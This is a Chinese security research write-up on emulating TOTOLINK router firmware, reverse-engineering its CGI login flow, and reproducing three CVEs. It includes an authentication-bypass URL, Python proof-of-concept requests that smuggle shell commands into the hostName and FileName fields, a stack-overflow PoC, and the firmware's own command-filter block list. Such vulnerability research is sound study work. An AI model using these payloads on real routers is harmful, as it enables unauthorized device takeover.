> 附件：链接: [https://pan.baidu.com/s/1RIclfq_L7hMz53IyGLgwfw](https://pan.baidu.com/s/1RIclfq_L7hMz53IyGLgwfw) 提取码: 2kii
>
> 本文首发于IOTsec-Zone
>

# 0、http服务模拟
该型号路由器的http服务模拟很简单，这里就简单的粘贴几行命令吧（如果你对具体的模拟步骤感兴趣，请参考之前的文章）：

```bash
# 0、经过收集信息后可知，该固件的架构为mipsel
# 1、配置ubuntu网卡：
$ sudo tunctl -t tap0
$ sudo ifconfig tap0 [ip]
# 2、启动qemu-system：
$ sudo qemu-system-mipsel -M malta \ 
    -kernel vmlinux-3.2.0-4-4kc-malta \
    -hda debian_squeeze_mipsel_standard.qcow2 \
    -append "root=/dev/sda1 console=tty0" -nographic \
    -net nic -net tap,ifname=tap0,script=no,downscript=no
# 3、binwalk -Me解压固件
# 4、压缩squashfs-root到squashfs-root.tar.gz，使用ssh将该压缩包传入qemu
# 5、qemu解压缩该压缩包，配置网络：
$ ifconfig eth0 [ip]
# 6、挂载：
$ mount -o bind /dev ./squashfs-root/dev && mount -t proc /proc ./squashfs-root/proc
# 7、进入shell：
$ chroot ./squashfs-root sh
```

该路由器的web服务由`/usr/sbin/lighttpd`管理，“尝试”直接在根目录启动：

> + “尝试”二字的深意：别忘了之前在模拟ASUS路由器时踩的坑！
>

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668059895946-b08a5b2c-eb31-4c44-bbef-6eec9439ee95.png)

提示需要config，搜索后发现在固件包中有现成的`/lighttp/lighttpd.conf`配置文件，直接加载就行`lighttpd -f /lighttp/lighttpd.conf`：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668060321661-5d002270-9bfe-45d8-a52d-deedb21ba501.png)

在浏览器中访问（qemu IP：`192.168.5.1`）：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668060399651-1cb1f4a1-5607-4102-814b-941010e0a7e8.png)

模拟成功。

# 1、TOTOLINK登录流程探寻
## ①、请求cstecgi.cgi
> + 因为我的Ubuntu虚拟机中没有Burpsuite，为了抓包方便，所以我使用`rinetd`将qemu的80端口映射到虚拟机的8080。
> + 此时虚拟机的ip为：`192.168.2.168`（在后续文章篇幅中因为网络环境的变化可能导致IP变化，注意一下就行）。
>

访问Web页面，输入密码`cyberangel`并抓取登录包：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668061193258-7810d6f9-229d-4ba5-960b-b86e4f80150e.png)

一个包一个包来看吧，首先是`/cgi-bin/cstecgi.cgi?action=login`：

```bash
# 请求包----------------------------------------------------------------------------------------------------------------------------------------------------
POST /cgi-bin/cstecgi.cgi?action=login HTTP/1.1
Host: 192.168.2.168:8080
Content-Length: 34
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.2.168:8080
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.2.168:8080/login.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

username=admin&password=cyberangel
# 响应包----------------------------------------------------------------------------------------------------------------------------------------------------
HTTP/1.1 302 Found
Connection: close
Content-type: text/plain
Connection: Keep-Alive
Pragma: no-cache
Cache-Control: no-cache
Location: http://192.168.2.168:8080/formLoginAuth.htm?authCode=0&userName=&goURL=login.html&action=login
Date: Wed, 09 Nov 2022 15:42:42 GMT
Server: lighttpd/1.4.20
Content-Length: 11

protal page
```

IDA打开`cstecgi.cgi`，搜索`formLoginAuth.htm`字符串，根据响应包的`Location`可以确定是使用了第三个：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668061413307-d53780ed-6365-4e0e-962c-ca6337f4165d.png)

交叉引用过去，定位到`sub_42AEEC`，我们将这个函数重命名为`check`；对此函数的一些变量重命名整理后，得到：

```c
int __fastcall check(int jsonData)
{
  char *loginAuthUrl; // $s5
  int v3; // $a0
  int v4; // $v0
  int v5; // $s2
  char *input_username; // $s2
  char *input_password; // $s5
  char *http_host; // $s3
  char *flag; // $s0
  char *verify; // $v0
  int verifyValue; // $s4
  int wizard_flag; // $s1
  int v13; // $s6
  char *http_username; // $v0
  char *http_passwd; // $v0
  int v16; // $s3
  int v17; // $s3
  BOOL authCode; // $s3
  int v19; // $s1
  int v20; // $v0
  char *v21; // $s0
  char goURL[128]; // [sp+28h] [-1830h] BYREF
  char v24[4096]; // [sp+A8h] [-17B0h] BYREF
  char v25[64]; // [sp+10A8h] [-7B0h] BYREF
  char v26[1024]; // [sp+10E8h] [-770h] BYREF
  char v27[128]; // [sp+14E8h] [-370h] BYREF
  char v28[256]; // [sp+1568h] [-2F0h] BYREF
  char host[256]; // [sp+1668h] [-1F0h] BYREF
  int http_username_cp[8]; // [sp+1768h] [-F0h] BYREF
  char v31; // [sp+1788h] [-D0h]
  int http_passwd_cp[8]; // [sp+178Ch] [-CCh] BYREF
  char v33; // [sp+17ACh] [-ACh]
  int v34[8]; // [sp+17B0h] [-A8h] BYREF
  char urlDecode_password[64]; // [sp+17D0h] [-88h] BYREF
  int v36[16]; // [sp+1810h] [-48h] BYREF
  char *v37; // [sp+1850h] [-8h]
  int tmpCJson; // [sp+1854h] [-4h]

  memset(goURL, 0, sizeof(goURL));
  memset(v24, 0, sizeof(v24));
  memset(v25, 0, sizeof(v25));
  memset(v26, 0, sizeof(v26));
  memset(v27, 0, sizeof(v27));
  memset(v28, 0, sizeof(v28));
  memset(host, 0, sizeof(host));
  http_username_cp[0] = 0;
  http_username_cp[1] = 0;
  http_username_cp[2] = 0;
  http_username_cp[3] = 0;
  http_username_cp[4] = 0;
  http_username_cp[5] = 0;
  http_username_cp[6] = 0;
  http_username_cp[7] = 0;
  v31 = 0;
  http_passwd_cp[0] = 0;
  http_passwd_cp[1] = 0;
  http_passwd_cp[2] = 0;
  http_passwd_cp[3] = 0;
  http_passwd_cp[4] = 0;
  http_passwd_cp[5] = 0;
  http_passwd_cp[6] = 0;
  http_passwd_cp[7] = 0;
  v33 = 0;
  v34[0] = 0;
  v34[1] = 0;
  v34[2] = 0;
  v34[3] = 0;
  v34[4] = 0;
  v34[5] = 0;
  v34[6] = 0;
  v34[7] = 0;
  memset(urlDecode_password, 0, sizeof(urlDecode_password));
  loginAuthUrl = websGetVar(jsonData, "loginAuthUrl", (char *)"");
  tmpCJson = cJSON_CreateObject();
  v3 = 0;
  v37 = v28;
  while ( 1 )
  {
    v5 = v3 + 1;
    if ( getNthValueSafe(v3, loginAuthUrl, "&", v26, 1024) == -1 )
      break;
    if ( getNthValueSafe(0, v26, "=", v27, 128) != -1 && getNthValueSafe(1, v26, "=", v37, 256) != -1 )
    {
      v4 = cJSON_CreateString(v37);
      cJSON_AddItemToObject(tmpCJson, v27, v4);
    }
    v3 = v5;
  }
  input_username = websGetVar(tmpCJson, "username", (char *)"");	// 获取用户输入的账号（该型号的路由器默传入的账号为admin）
  input_password = websGetVar(tmpCJson, "password", (char *)"");	// 获取用户输入的密码
  http_host = websGetVar(tmpCJson, "http_host", (char *)"");
  flag = websGetVar(tmpCJson, "flag", (char *)&word_4370EC);
  verify = websGetVar(tmpCJson, "verify", (char *)&word_4370EC);
  verifyValue = atoi(verify);
  wizard_flag = nvram_get_int("wizard_flag");
  if ( wizard_flag )
  {
    v13 = nvram_safe_get("opmode_custom");
    if ( nvram_get_int("ren_qing_style") == 1 )
    {
      wizard_flag = 1;
    }
    else if ( (!strcmp(v13, "gw") || !strcmp(v13, "wisp")) && isWanConnected()
           || !strcmp(v13, "rpt") && get_apcli_connected() == 1
           || !strcmp(v13, "br") && nvram_get_int("dl_status_lan") == 1 )
    {
      wizard_flag = 0;
    }
  }
  urldecode((int)input_password, urlDecode_password);
  http_username = (char *)nvram_safe_get("http_username");			// 获取路由器后台的账号
  strcpy((char *)http_username_cp, http_username);
  http_passwd = (char *)nvram_safe_get("http_passwd");				// 获取路由器后台的密码
  strcpy((char *)http_passwd_cp, http_passwd);
  if ( *http_host )
    strcpy(host, http_host);
  else
    strcpy(host, (char *)v34);
  if ( verifyValue == 1 )
  {
    v16 = nvram_get_int("verify_code_flag") + 1;
    nvram_set_int_temp("verify_code_flag", v16);
    if ( v16 >= 3 )
    {
      sysinfo(v36);
      sprintf(v25, "%ld", v36[0]);
      nvram_set_temp("tmp_sys_uptime", v25);
    }
    if ( !strcmp(flag, "ie8") )
    {
      strcpy(goURL, "login_ie.html");
    }
    else if ( atoi(flag) == 1 )
    {
      strcpy(goURL, "phone/login.html");
    }
    else
    {
      strcpy(goURL, "login.html");
    }
    goto LABEL_54;
  }
  nvram_set_int_temp("verify_code_flag", 0);
  nvram_set_int_temp("tmp_sys_uptime", 0);
  v17 = strcmp(input_username, http_username_cp);					// 检查输入的username是否正确
  if ( !strcmp(urlDecode_password, http_passwd_cp) )				// 检查输入的password是否正确
                                                                    // 根据检查确定authCode的值
    	/*
        注意：
			这里变量"authCode"的命名可不是乱来的，是我根据下面的
        	",\"redirectURL\":\"http://%s/formLoginAuth.htm?authCode=%d&userName=%s&goURL=%s&action=login\"}"
        	得来的
		*/ 
    authCode = v17 != 0;
  else
    authCode = 1;
  if ( flag )
    strcpy(input_username, (char *)http_username_cp);	// 若flag未设置，则input_username默认为admin（strcpy）
  if ( !strcmp(input_username, http_username_cp) && !strcmp(urlDecode_password, http_passwd_cp)
    || nvram_get_int("ren_qing_style") == 1 && !*(_BYTE *)nvram_safe_get("http_passwd") )
  {
    if ( !strcmp(flag, "ie8") )
    {
      strcpy(goURL, "wan_ie.html");
    }
    else if ( atoi(flag) == 1 )
    {
      if ( wizard_flag )
        strcpy(goURL, "phone/wizard.html");
      else
        strcpy(goURL, "phone/home.html");
    }
    else if ( wizard_flag )
    {
      strcpy(goURL, "wizard.html");
    }
    else
    {
      strcpy(goURL, "home.html");
    }
    nvram_set_int_temp("cloudupg_checktype", 1);
    doSystem("lktos_reload %s", "cloudupdate_check 2>/dev/null");
    authCode = 1;
  }
  else
  {
    if ( !strcmp(flag, "ie8") )
    {
      strcpy(goURL, "login_ie.html");
    }
    else if ( atoi(flag) == 1 )
    {
      strcpy(goURL, "phone/login.html");
    }
    else
    {
      strcpy(goURL, "login.html");
    }
    if ( authCode )
    {
LABEL_54:
      system("echo ''> /tmp/login_flag");
      authCode = 0;
      goto LABEL_55;
    }
  }
LABEL_55:
  snprintf(v24, 4096, "{\"httpStatus\":\"%s\",\"host\":\"%s\"", "302", host);
  v19 = strlen(v24);
  if ( atoi(flag) == 1 )
  {
    snprintf(
      &v24[v19],
      4096 - v19,
      ",\"redirectURL\":\"http://%s/formLoginAuth.htm?authCode=%d&userName=%s&goURL=%s&action=login&flag=1\"}",
      host,
      authCode,
      input_username,
      goURL);
  }
  else if ( !strcmp(flag, "ie8") )
  {
    snprintf(
      &v24[v19],
      4096 - v19,
      ",\"redirectURL\":\"http://%s/formLoginAuth.htm?authCode=%d&userName=%s&goURL=%s&action=login&flag=ie8\"}",
      host,
      authCode,
      input_username,
      goURL);
  }
  else
  {                           // 根据前面的抓包可知，程序流程走的是该else分支
    snprintf(
      &v24[v19],
      4096 - v19,
      ",\"redirectURL\":\"http://%s/formLoginAuth.htm?authCode=%d&userName=%s&goURL=%s&action=login\"}",// 响应包
      host,
      authCode,
      input_username,
      goURL);
  }
  v20 = cJSON_Parse(v24);
  v21 = websGetVar(v20, "redirectURL", (char *)"");
  puts("HTTP/1.1 302 Redirect to page");
  puts("Content-type: text/plain");
  puts("Connection: Keep-Alive\nPragma: no-cache\nCache-Control: no-cache");
  printf("Location: %s\n\n", v21);
  printf("protal page");		// protal page
  return 0;
}
```

如上面代码框中第250行所示，响应包的`protal page（门户页面）`正是来自这里，如下图所示：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668063852551-abc03c57-783b-4d63-a90e-eb7a8c916101.png)

继续对check函数交叉引用，有：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668062493185-239e4681-1059-470c-a4af-55863cd604fa.png)

大致翻看了一下周边的数据，发现它们都存放在某个“字典”中；例如，我们可以使用某个`键（key）`来调用`check`函数【`值(value）`】。对`check_function`交叉引用后可来到main函数，大致逆向后，有如下伪代码：

> + 注：这里“字典”、“键（key）”、“值（value）”这三个概念均引用自Python的dict数据类型
>

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int userQueryURL; // $s0
  int v4; // $v0
  int v5; // $s1
  int v6; // $s2
  int v7; // $s1
  char *loginAuthUrl; // $s5
  int flag_TruE; // $s1
  BOOL verify_error; // $s0
  const char *http_host; // $a3
  char *loginJsonData_cp; // $a0
  int v13; // $s1
  int v14; // $s3
  int v15; // $s3
  int v16; // $v0
  int jsonData; // $s6
  int userTopicurl; // $s3
  int v19; // $v0
  int NEED_AUTH; // $v0
  int v22; // $v0
  int (*v23)(); // $s2
  int (**v24)(); // $s1
  int v25; // $s0
  bool v26; // dc
  int (**v27)(); // $s1
  int v28; // $s0
  int (**v29)(); // $s1
  int v30; // $s0
  int (**v31)(); // $s1
  int v32; // $s0
  int v33; // $s0
  const char *v34; // $v0
  char v35[256]; // [sp+28h] [-1244h] BYREF
  char loginJsonData[4096]; // [sp+128h] [-1144h] BYREF
  char v37[256]; // [sp+1128h] [-144h] BYREF
  int v38[8]; // [sp+1228h] [-44h] BYREF
  int v39[9]; // [sp+1248h] [-24h] BYREF

  memset(v35, 0, sizeof(v35));
  memset(v37, 0, sizeof(v37));
  memset(loginJsonData, 0, sizeof(loginJsonData));
  userQueryURL = getenv("QUERY_STRING");
  v4 = getenv("CONTENT_LENGTH");
  v5 = strtol(v4, 0, 10);
  v6 = getenv("stationIp");
  if ( !v6 )
    v6 = getenv("REMOTE_ADDR");
  v7 = v5 + 1;
  loginAuthUrl = (char *)malloc(v7);
  memset(loginAuthUrl, 0, v7);
  fread(loginAuthUrl, 1, v7, stdin);
  if ( !userQueryURL )
    goto LABEL_15;
  if ( strstr(userQueryURL, "action=login") )	// 传入的url有“action=login”字样
  {
    if ( strstr(userQueryURL, "flag=ie8") )
    {                                           // ie8浏览器
      v33 = strstr(userQueryURL, "verify=error");
      v34 = (const char *)getenv("http_host");
      sprintf(
        loginJsonData,
        "{\"topicurl\":\"loginAuth\",\"loginAuthUrl\":\"%s&http_host=%s&flag=ie8&verify=%d\"}",
        loginAuthUrl,
        v34,
        v33 != 0);
      loginJsonData_cp = loginJsonData;
    }
    else
    {                                           // 非ie8浏览器
      flag_TruE = strstr(userQueryURL, "flag=1");
      verify_error = strstr(userQueryURL, "verify=error") != 0;
      http_host = (const char *)getenv("http_host");
      if ( flag_TruE )
        sprintf(
          loginJsonData,
          "{\"topicurl\":\"loginAuth\",\"loginAuthUrl\":\"%s&http_host=%s&flag=1&verify=%d\"}",
          loginAuthUrl,
          http_host,
          verify_error);
      else
        sprintf(
          loginJsonData,
          "{\"topicurl\":\"loginAuth\",\"loginAuthUrl\":\"%s&http_host=%s&verify=%d\"}",
          loginAuthUrl,
          http_host,
          verify_error);
      loginJsonData_cp = loginJsonData;
    }
    goto LABEL_16;                              // 无论是什么浏览器，最终都得goto到LABEL_16
  }
  if ( !strstr(userQueryURL, "action=upload") )
  {
LABEL_15:
    loginJsonData_cp = loginAuthUrl;
    goto LABEL_16;
  }
  v38[0] = 0;
  v38[1] = 0;
  v38[2] = 0;
  v38[3] = 0;
  v38[4] = 0;
  v38[5] = 0;
  v38[6] = 0;
  v38[7] = 0;
  v39[0] = 0;
  v39[1] = 0;
  v39[2] = 0;
  v39[3] = 0;
  v39[4] = 0;
  v39[5] = 0;
  v39[6] = 0;
  v39[7] = 0;
  v13 = getenv("UPLOAD_FILENAME");
  v14 = getenv("CONTENT_LENGTH");
  getNthValueSafe(1, (void *)userQueryURL, "&", v35, 256);
  v15 = cutUploadFile(v37, v13, v14);
  if ( !strcmp(v35, "UploadOpenVpnCert") )
  {
    getNthValueSafe(2, (void *)userQueryURL, "&", v38, 32);
    getNthValueSafe(3, (void *)userQueryURL, "&", v39, 32);
    sprintf(
      loginJsonData,
      "{\"topicurl\":\"%s\",\"FileName\":\"%s\",\"ContentLength\":\"%d\",\"cert_type\":\"%s\",\"cert_name\":\"%s\",\"Full"
      "Name\": \"%s\" }",
      v35,
      "/tmp/linux.trx",
      v15,
      (const char *)v38,
      (const char *)v39,
      v37);
  }
  else
  {
    v16 = strstr(userQueryURL, "flag=1");
    sprintf(
      loginJsonData,
      "{\"topicurl\":\"%s\",\"FileName\":\"%s\",\"ContentLength\":\"%d\",\"flags\":\"%d\",\"FullName\": \"%s\" }",
      v35,
      "/tmp/linux.trx",
      v15,
      v16 != 0,
      v37);
  }
  loginJsonData_cp = loginJsonData;
LABEL_16:										// LABEL_16
  jsonData = cJSON_Parse(loginJsonData_cp);     // cJSON_Parse：string -> json
  userTopicurl = (int)websGetVar(jsonData, "topicurl", (char *)"");// 获取topicurl【topic-url，该变量很重要】
  v19 = strchr(userTopicurl, '/');
  if ( v19 )
    userTopicurl = v19 + 1;
  NEED_AUTH = getenv("NEED_AUTH");
  if ( NEED_AUTH
    && !strcmp(NEED_AUTH, "1")
    && strcmp(userTopicurl, "getInitCfg")
    && strcmp(userTopicurl, "getLoginCfg")
    && strcmp(userTopicurl, "loginAuth")        // 登录
    && strcmp(userTopicurl, "UploadCustomModule")
    && strcmp(userTopicurl, "getSysStatusCfg")
    && strcmp(userTopicurl, "getCrpcCfg") )
  {
    sub_42EFC0(501);                            // HTTP/1.1 501 OK
    return 0;
  }
  if ( strstr(userTopicurl, "getDmzCfg") )
  {
    v22 = cJSON_CreateString(v6);
    cJSON_AddItemToObject(jsonData, "stationIp", v22);
  }
  if ( strstr(userTopicurl, "get") )            // get
  {
    v23 = off_44A090;
    v24 = &off_44A0D4;
    if ( off_44A090 )
    {
      v25 = 0;
      while ( strncmp(userTopicurl, &get_handle_t[68 * v25], 64) )
      {
        ++v25;
        v23 = *v24;
        v26 = *v24 != 0;
        v24 += 17;
        if ( !v26 )
          goto LABEL_54;
      }
LABEL_52:
      ((void (__fastcall *)(int))v23)(jsonData);// 调用函数
      goto LABEL_54;                            // LABEL_54:
                                                //   cJSON_Delete(jsonData);
                                                //   free(loginAuthUrl);
                                                //   return 0;
    }
  }
  else if ( strstr(userTopicurl, "set") )       // set
  {
    v23 = off_44B040;
    v27 = &off_44B084;
    if ( off_44B040 )
    {
      v28 = 0;
      while ( strncmp(userTopicurl, &set_handle_t[68 * v28], 64) )
      {
        ++v28;
        v23 = *v27;
        v26 = *v27 != 0;
        v27 += 17;
        if ( !v26 )
          goto LABEL_54;
      }
      goto LABEL_52;
    }
  }
  else
  {
    if ( !strstr(userTopicurl, "del") )
    {                                           // 若找不到del
      v23 = check_function;
      if ( !check_function )
        goto LABEL_54;
      v31 = &off_44C0B8;
      v32 = 0;
      while ( strncmp(userTopicurl, &other_handle_t[68 * v32], 0x40) )
      {
        ++v32;
        v23 = *v31;
        v26 = *v31 != 0;
        v31 += 17;
        if ( !v26 )
          goto LABEL_54;
      }
      goto LABEL_52;                            // 调用相应的函数
    }
    v23 = off_44BD00;                           // del
    v29 = &off_44BD44;
    if ( off_44BD00 )
    {
      v30 = 0;
      while ( strncmp(userTopicurl, &del_handle_t[68 * v30], 0x40) )
      {
        ++v30;
        v23 = *v29;
        v26 = *v29 != 0;                        // failure
        v29 += 17;
        if ( !v26 )
          goto LABEL_54;
      }
      goto LABEL_52;                            // 调用相应的函数
    }
  }
LABEL_54:
  cJSON_Delete(jsonData);
  free(loginAuthUrl);
  return 0;
}
```

这个函数也很简单，说白了就是根据用户请求的参数去调用了相应的函数，更详细的说明我们留到“漏洞复现”再说。

## ②、请求lighttpd
![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668063927517-8081e9f0-17cd-4f54-9e47-a94db1dc7abd.png)

经过`cstecgi.cgi`会得到`http://192.168.2.168:8080/formLoginAuth.htm?authCode=0&userName=&goURL=login.html&action=login`，由于目标文件`formLoginAuth.htm`为htm文件，所以需要交由`lighttpd`处理。对`lighttpd`逆向搜索`"formLoginAuth.htm"`，来到`userloginAuth`函数：

```c
BOOL __fastcall userloginAuth(int a1, int a2, _BYTE *a3)	// 1、cstecgi.cgi与lighttpd在编译时都没有去符号
{															// 2、userloginAuth为lighttpd自带符号
  int v4; // $s2

  v4 = **(_DWORD **)(a1 + 320);
  if ( strstr(v4, "formLoginAuth.htm") )
  {
    Form_Login(a1, a2, (int)a3);                // login
    return 1;
  }
  if ( strstr(v4, "formLogout.htm") )
  {
    Form_Logout(a1, a2, a3);
    return 1;
  }
  if ( strstr(v4, "formLogoutAll.htm") )
  {
    Form_LogoutAll(a1, a2);
    return 1;
  }
  a3[3] = 0;
  *a3 = 0;
  a3[1] = 0;
  a3[2] = 0;
  return checkLoginUser(a1, a2) == 1;
}
```

根据函数名称"用户登录验证"就知道来对了位置，`Form_Login`有如下两块代码：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668066217313-0ea5fb98-89bf-406d-9b67-88277280b6cf.png)

很清晰的可以看到当`authCode == 1`时即可让`lighttpd`生成session。说到这里就要引起我们的注意了，之前的`cstecgi.cgi`中就有一个`authCode`的变量，根据这两个二进制文件的关系可知：

1. `cstecgi.cgi`的`authCode`为stack上的局部变量，lighttpd的authCode由URL传入。
2. 根据本次的网络请求，`cstecgi.cgi`中生成的`authCode值`通过URL的方式传入到了lighttpd中。
3. `lighttpd`根据`authCode`决定是否生成session。

这就很明显了，虽然当密码错误时`cstecgi.cgi`生成的`authCode`我们无法控制，但是两个二进制文件之间的authCode传递可以由我们任意控制，即这里存在未授权登录漏洞：`http://192.168.2.177:8080/formLoginAuth.htm?authCode=1&action=login`（此时虚拟机IP为`192.168.2.177`）。我们可以动态调试看一下：

1. IDA中`Form_Login`下断点：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668126308076-45f5870f-ec69-4fe8-9c66-5f9a4d74ae20.png)

2. 执行`lighttpd`
3. qemu执行`./gdbserver-7.7.1-mipsel-mips32-v1 --attach :1234 [lighttpd_PID]`
4. IDA连接gdbserver
5. 访问`http://192.168.2.177:8080/formLoginAuth.htm?authCode=1&action=login`

得到：

```c
int __fastcall Form_Login(int user_struct, int a2, int a3)	// user_struct是有关“用户传入的参数”的结构体
{
	// ...
  v6 = (char *)inet_ntoa(*(_DWORD *)(user_struct + 128));	// *(user_struct + 128) == "192.168.2.177"

  authCodeValue = 0;
  if ( !buffer_is_empty(*(_DWORD *)(user_struct + 328)) )
  {
    strncpy(v25, **(_DWORD **)(user_struct + 328), 1023);
	// ...
    while ( 1 )
    {
      v26 = (char *)(v10 + 1);
      if ( getNthValueSafe(v10, (int)v27, 38, (int)v24, 512) == -1 )
        break;
      if ( getNthValueSafe(0, (int)v24, 61, (int)v21, 128) != -1 && getNthValueSafe(1, (int)v24, 61, v9, 128) != -1 )
      {	// v24 == "authCode=0"
        if ( strstr(v21, "authCode") )	// *v21 == "authCode"
          authCodeValue = atoi(v9);		// authCodeValue == *v9 == "1"
        if ( strstr(v21, "userName") )
          strcpy(v31, v9);
        if ( strstr(v21, "password") )
          strcpy(v30, v9);
        if ( strstr(v21, "goURL") )
          strcpy(v29, v9);
        if ( strstr(v21, "flag") )
          strcpy(v28, v9);
      }
      v10 = (int)v26;
    }
  }
    // ...
}
```

从上面代码框的结果来看，这里确实可以绕过登录。该过程会发送3个关键的数据包，302重定向时即可获取有效的`SESSION_ID`：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668127063203-ae99fe15-d4af-4763-8a94-c86a5e824d4a.png)

# 2、漏洞复现
下面我们会开始复现3个CVE，有关于这些CVE的详细信息均可以在IoTsec-Zone的安全情报中找到：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668064457632-4dccacd1-2ad8-4454-9164-737a690c3f39.png)

## ①、CVE-2022-41525
该漏洞点在`cstecgi.cgi`的`sub_421C98`函数中：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668128109666-2995de16-20a8-4350-95a2-fc6f5c50932f.png)

反复交叉引用，调用链如下：`sub_422D3C` -> `sub_421C98`：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668128219994-e97ec157-a3a8-4085-8374-da42d0ecfb07.png)

`sub_42B9F8`-> `sub_422D3C` -> `sub_421C98`：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668128293018-57813e77-0f51-461c-b7ca-5097f7e090ed.png)

继续交叉引用，发现IDA无法继续查找了：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668128575813-db5d560d-3607-4cb8-b2af-157ba449c9dc.png)

其实这是IDA的锅，还记得之前的那个`check`函数吗：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668129191987-0540b0ee-dd88-4e4d-ab7a-a1f09549747b.png)

它的调用流程为：

1. 获取topicurl：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668129470931-b2603001-1e83-4edc-a87e-d47a1f8e441b.png)

2. 匹配对应的函数：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668129269026-57fbd621-9793-47d1-ab44-993fb48a9993.png)

3. 调用函数：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668129989500-8490a25b-f71c-4389-80e6-76f03aa996fd.png)

如下图所示，“键（key）”就是"loginAuth"字符串，“值（value）”就是check函数：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668130191273-74568008-7973-4938-8853-eb70f727e682.png)

while循环会以`check_function`为起始地址根据用户传入的topicurl（key）遍历`other_handle_t`函数表，直到查找到用户指定功能的函数地址（value）；相应的，现在我们寻找的`sub_42B9F8`应该也有对应的topicurl，既然该函数中有这么多关于nvram的设置，那我盲猜它属于`set_handle_t`：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668129736323-e46cc165-e3c1-4181-a619-2bf3b51e68eb.png)

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668130277054-cecc68b0-b945-4796-94e6-1ca07868ec88.png)

向下滑动查找就能找到：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668130504255-accf06df-c994-443c-8a97-4900b4111c78.png)

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668130340854-e29dce35-2681-4c8b-aecd-44896fde2448.png)

所以该函数的名称为`setOpModeCfg`：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668130574084-98dca1b4-ce9e-49c1-8ce3-d88536684fa8.png)

综合上面的信息，可以有以下poc：

```python
import requests

url = "http://192.168.5.1/cgi-bin/cstecgi.cgi"			# 目标可执行文件
cookie = {"Cookie":"SESSION_ID=2:1668131006:2"}			# 有效的cookie，通过前面的验证绕过即可获取
data = {
    "topicurl" : "setOpModeCfg",						# setOpModeCfg
	"proto" : "5",										# 将值设置为5
	"switchOpMode" : "1",
	"hostName" : "';ls -al /;'"							# 命令注入，websGetVar(a1,"hostName","") == ";ls -al /;"(注意这里是两层引号)
                                                        # 因为：echo '%s' > /proc/sys/kernel/hostname
}
response = requests.post(url, json=data, cookies=cookie)	# 授权命令执行
print(response.text)
```

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668131294642-7d7f9ecb-3794-41d9-b5fd-5d8049e0b130.png)

## ②、CVE-2022-41518
`CVE-2022-41525`的成因是`cstecgi.cgi`的`doSystem`过滤不严谨，依循着这条链查找：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668132000975-f55cb628-bb81-4ee6-9c2c-6f97e0609826.png)

确实有很多函数调用了doSystem，那就看参数可控不可控了。`CVE-2022-41518`的漏洞存在于`UploadFirmwareFile`，同样，需要像之前一样处理下：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668133385207-bc1ea932-2af4-4bfb-af54-eefa9cc62698.png)

交叉引用到`sub_42D3B4`：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668133537057-4ee248d2-3789-4d57-8d39-094b4174ebc0.png)

该CVE也是授权命令执行，但结合之前的漏洞可以成为未授权命令执行，poc如下：

```python
import requests
url = "http://192.168.5.1/cgi-bin/cstecgi.cgi"
cookie = {"Cookie":"SESSION_ID=2:1668133776:2"}
data = {
    'topicurl' : "UploadFirmwareFile",
	"FileName" : ";ls -al /;"
}
response = requests.post(url, cookies=cookie, json=data)
print(response.status_code)
print(response.text)
```

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668133829657-c60df908-92d3-4aec-9b0f-448fbf0d5daf.png)

## ③、CVE-2022-41523
漏洞类型为Stack OverFlow，漏洞点仍然在`cstecgi.cgi`：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668134166155-44c187c9-2e15-4285-aa20-2ff1995cab5b.png)

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1668137178330-2f61f424-5924-4060-9689-8ca88f13719a.png)

这里没有命令执行漏洞，因为对用户输入的字符进行了过滤（那为啥前面的漏洞不过滤呢？是在想不通...）：

```c
BOOL __fastcall Validity_check(int a1)
{
  BOOL result; // $v0

  if ( strchr(a1, ';')
    || strstr(a1, ".sh")
    || strstr(a1, "iptables")
    || strstr(a1, "telnetd")
    || strchr(a1, '&')
    || strchr(a1, '|')
    || strchr(a1, '`')
    || strchr(a1, '$') )
  {
    result = 1;
  }
  else
  {
    result = strchr(a1, '\n') != 0;
  }
  return result;
}
```

栈溢出的poc如下：

```python
import requests

url = "http://192.168.5.1/cgi-bin/cstecgi.cgi"
cookie = {"Cookie":"SESSION_ID=2:1668135762:2"}
data = {
    'topicurl' : "setTracerouteCfg",
	"command" : "a"*0x1000,
    "num": "1"
 }
response = requests.post(url, cookies=cookie, json=data)
print(response.text)
print(response)
```

